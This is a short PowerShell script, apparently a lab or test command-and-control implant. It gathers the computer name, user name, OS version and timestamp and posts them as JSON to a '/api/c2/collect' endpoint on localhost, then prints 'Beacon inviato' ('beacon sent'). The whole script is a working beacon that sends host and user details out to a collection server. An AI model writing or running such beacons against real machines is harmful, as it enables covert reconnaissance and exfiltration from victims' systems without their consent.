$body = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-CimInstance Win32_OperatingSystem).Caption
    timestamp = (Get-Date).ToString("o")
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:3000/api/c2/collect" -Method POST -Body $body -ContentType "application/json"
Write-Host "Beacon inviato"
